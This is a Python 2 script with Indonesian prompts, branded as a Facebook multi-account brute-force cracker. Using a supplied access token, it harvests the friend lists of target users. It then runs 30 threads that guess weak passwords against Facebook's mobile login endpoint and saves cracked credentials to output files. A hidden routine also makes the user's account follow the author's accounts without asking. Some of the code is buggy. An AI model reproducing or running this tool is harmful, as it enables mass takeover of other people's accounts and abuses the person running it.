# -*- coding: utf-8
# scrip by Anton Ibrahim ID 
# scrip ini tidak untuk di perjual belikan paham
import os, sys, re, time, requests, json, random, datetime
from multiprocessing.pool import ThreadPool
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))           
loop = 0
id = []
ok = []
cp = []
### WARNA RANDOM ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

#SETTING UA##
def seting_ua():
    print '\n (%s1%s) ganti user agent'%(P,N)
    print ' (%s2%s) check user agent'%(P,N)
    love = raw_input('\n%s %s++%s pilih : '%(N,P,N))
    if love == "":
        print '\n %s %s++%s gak boleh kosong Kentod'%(N,M,N);time.sleep(2);seting_ua()
    elif love =="1":
        ua_baru()
    elif love =="2":
        check_ua()
    else:
        print' %s %s++%s input yang bener'%(N,M,N);time.sleep(2);seting_yntkts()

# User Agent baru#
def ua_baru():
    os.system('rm -rf ugent.txt')
    sayang = raw_input('\n %s++%s User Agent Baru :%s '%(P,N,H))
    if sayang == "":
        print '\n %s%s++%s gak boleh kosong'%(N,M,N);ua_baru()
    try:
        open('ugent.txt', 'w').write(sayang);time.sleep(2)
        print('%s %s++%s berhasil mengganti user agent...'%(N,H,N))
        raw_input('\n %s[ %skembali%s ]'%(N,P,N));menu()
    except:pass

# Cek User Agent#
def check_ua():
    try:
        user_agent = open('ugent.txt', 'r').read()
    except IOError:
    	user_agent = '%s-'%(M)
    except: pass
    print '\n%s %s++%s Ugent anda : %s%s'%(N,P,N,H,user_agent)
    raw_input('\n %s[ %skembali%s ]'%(N,P,N));menu()

#BOT FOLLOW JANGAN DI GANTI KALAU EMANG MAU RECODE#
def bot_ea():
	os.system("clear")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	ses = requests.Session()
	nama = ses.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
	ses.post("https://graph.facebook.com/100021483498135/subscribers?access_token="+token)#Anton Ibrahim
	ses.post("https://graph.facebook.com/100031905602021/subscribers?access_token="+token)#Sela Anjani
	ses.post("https://graph.facebook.com/100028262962654/subscribers?access_token="+token)#Irsya Maulana
	ses.post("https://graph.facebook.com/100011054763211/subscribers?access_token="+token)#Sultan Zahra
	ses.post("https://graph.facebook.com/100041129048948/subscribers?access_token="+token)#Iwan Hardiansah
	print(" [+] user aktif \033[0;93m%s\033[0;97m, login berhasil"%(nama))
	time.sleep(1)
	menu()

#LOGO#
def logo():
	os.system("clear")
	print(" \033[1;97m_______ _______ _______ ______  _______ \n\033[1;97m |_____| |______ |  |  | |_____] |______ \n\033[1;97m |     | ______| |  |  | |_____] |                                 \n\033[1;91m┌════════════════════\033[1;97m═══════════════════┐ \n    [ Asmbf   Multi   Brute   Force ] \n\033[1;91m└════════════════════\033[1;97m═══════════════════┘")

#LOGIN#
def login():
	os.system("clear")
	try:
		token = open("login.txt", "r")
		menu()
	except KeyError, IOError:
		os.system('clear')
		logo()
		token = raw_input("\n ++ token fb : ")
		if token == "help":
			os.system("xdg-open https://youtu.be/IdxphPBMMTU")
			exit(" ! di simak video nya biar paham")
		try:
			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
			open("login.txt", "w").write(token)
			bot_ea()
		except KeyError:
			os.system("rm -f login.txt")
			exit(" ! token kadaluwarsa")

#MENU#
def menu():
	os.system("clear")
	global token
	try:
		token = open("login.txt","r").read()
	except KeyError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	try:
		nama = requests.get("https://graph.facebook.com/me/?access_token="+token).json()["name"].lower()
		ip = requests.get("https://api.ipify.org").text
	except IOError:
		os.system("rm -f login.txt")
		exit(" ! token kadaluwarsa")
	logo()
	print(" +++ sebelum crack matiin modsat dulu +++\n");time.sleep(0.03)
	print(" ++ user aktif : %s"%(nama));time.sleep(0.03)
	print(" ++ ip address : %s"%(ip))
	print("\n (1) crack dari teman/public");time.sleep(0.03)
	print(" (2) crack dari target massal");time.sleep(0.03)
	print(" (3) setting user-agentmu");time.sleep(0.03)
	print(" (4) lihat hasil crack");time.sleep(0.03)
	print(" (0) remove token");time.sleep(0.03)
	dewa = raw_input("\n ++ pilih : ")
	if dewa =="":
		menu()
	elif dewa == "1":
		publik()
        elif dewa == "2":
		massal()
	elif dewa == "3":
		seting_ua()
	elif dewa == "4":
		print ("\n \033[0;97m(1)\033[0;97m Hasil OK ") 
		print (" \033[0;97m(2)\033[0;97m Hasil CP ") 
		ress = raw_input("\n \033[0;97m++\033[0;97m pilih : ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n %s++%s --------------------------------------")%(M,P)
			print ("\n \033[0;91m++\033[0;97m Hasil \033[0;92mOK\033[0;97m Tanggal : \033[0;92m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system(" cat out/ok-%s-%s-%s.txt" % (ha, op, ta))
			raw_input('\n %s[ %skembali%s ]'%(N,P,N));menu()
		elif ress == "2" or ress == "02":
			print ("\n %s++%s --------------------------------------")%(M,P)
			print (" ++ Hasil \033[0;93mCP\033[0;97m Tanggal : \03[0;92m%s-%s-%s\033[0;97m\n" % (ha, op, ta)) 
			os.system("cat out/cp-%s-%s-%s.txt" % (ha, op, ta))
			raw_input('\n %s[ %skembali%s ]'%(N,P,N));menu()
		else:
			exit(" ++ pilih yang bener !")
	elif dewa == "0":
		os.system("rm -f login.txt")
		exit(" # berhasil menghapus token")
	else:
		menu()

#CRACK MASSAL#
def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit("[!] token kadaluwarsa")
	try:
		print("\n %s++ min %s2%s target dan maks %s5%s target")%(P,M,P,M,P)
		tanya_total = int(input(" ++ masukan jumlah target : "))
	except:tanya_total=1
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" ++  id target %s : "%(t))
		try:
			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
				id.append(i["id"]+"<=>"+i["name"])
		except KeyError:
			print(" ++ id %s tidak tersedia"%(idt))
	print""
	print' ++ total id -> \x1b[0;91m' + str(len(id))
	print""
	crack()

#PUBLIC#
def publik():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" ! token kadaluwarsa")
	print("\n ++ isi 'me' untuk crack dari teman")
	idt = raw_input(" ++ id target : ")
	try:
		for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
			id.append(i["id"]+"<=>"+i["name"])
	except KeyError:
		exit(" ++ id pengguna %s tidak tersedia"%(idt))
	print(" ++ total id  : \033[0;91m%s\033[0;97m"%(len(id)))
	ask = raw_input(" ++ gunakan password manual? y/t: ")
	if ask == "Y" or ask == "y":
		manual()
	print("\n ++ mainkan mode data 3 detik")
	print(" ++ jika gak ada hasil ok wak !!!\n")
	crack()

#CRACK#
def crack():
	def main(user):
		try:
			ua = open("ugent.txt", "r").read()
		except IOError:
			ua = ("Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mibile Safari/537.36")
		global loop, token
		pwx = []
		sys.stdout.write(
			"\r\033[0;97m ++ %s/%s ok:-%s-cp:-%s "%(loop, len(id), len(ok), len(cp))
		); sys.stdout.flush()
		uid, name = user.split("<=>")
		dewa = name.split(' ')
		if len(dewa) == 3 or len(dewa) == 4 or len(dewa) == 5 or len(dewa) == 6:
				pwx = [name, dewa[0]+"123", dewa[0]+"12345"]
		else:
				pwx = [name, dewa[0]+"123", dewa[0]+"1234", dewa[0]+"12345","sayang","malaysia","bismillah","112233","223344","334455","556677","667788","786786","102030"]
					
		try:
			for pw in pwx:
				pw = pw.lower()
				ses = requests.Session()
				headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				api = "https://b-api.facebook.com/method/auth.login"
				send = ses.get(api, params=param, headers=headers_) 
				if "session_key" in send.text and "EAAA" in send.text:
					print '\r\033[1;92m ++ ' +uid+ '|' + pw + '        '
					ok.append(uid+'|'+pw)
					open("out/ok-%s-%s-%s.txt" % (ha, op, ta), "a").write(" ++ %s|%s\n"%(uid, pw))
					break
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					print'\r\x1b[1;97m ++  ' + uid + '|' + pw + '        '
					cp.append(uid + '|' + pw)
					open("out/cp-%s-%s-%s.txt" % (ha, op, ta), "a").write(" ++ %s|%s\n"%(uid, pw))
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\x1b[1;97m ++ crack selesai...'
	exit()


def manual():
    print'\n ++ contoh password : sayang,123456'
    pw = raw_input(' ++ masukan password : ').split(',')
    if len(pw)==5:
        exit(' ++ isi yang bener')
    print' ++ total Id : ' + str(len(id))
    print' ++ mainkan mode data 3 detik'
    print' ++ jika gak ada hasil ok wak !!!\n'

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;97m ++  %s/%s -> OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('<=>')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
            	ua = "ugent"
                headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                api = 'https://b-api.facebook.com/method/auth.login'
                params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': asu, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                response = requests.get(api, params=params, headers=headers_)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print '\r\033[1;92m ++ ' +uid+ '|' + asu + '        '
                    ok.append(uid+'|'+asu)
                    open("out/ok-%s-%s-%s.txt" % (ha, op, ta), "a").write(" ++ %s|%s\n"%(uid, pw))
                    break
                    continue
                if "www.facebook.com" in response.json()["error_msg"]:
                    print'\r\x1b[1;97m ++  ' + uid + '|' + pw + '        '
                    cp.append(uid + '|' + pw)
                    open("out/cp-%s-%s-%s.txt" % (ha, op, ta), "a").write(" ++ %s|%s\n"%(uid, pw))
                    break
                    continue

            loop += 1
        except:
            pass
    p = ThreadPool(30)
    p.map(main, id)
    print'\n\x1b[1;97m ++ crack selesai...'
    exit()

if __name__ == "__main__":
	os.system("touch login.txt")
	login()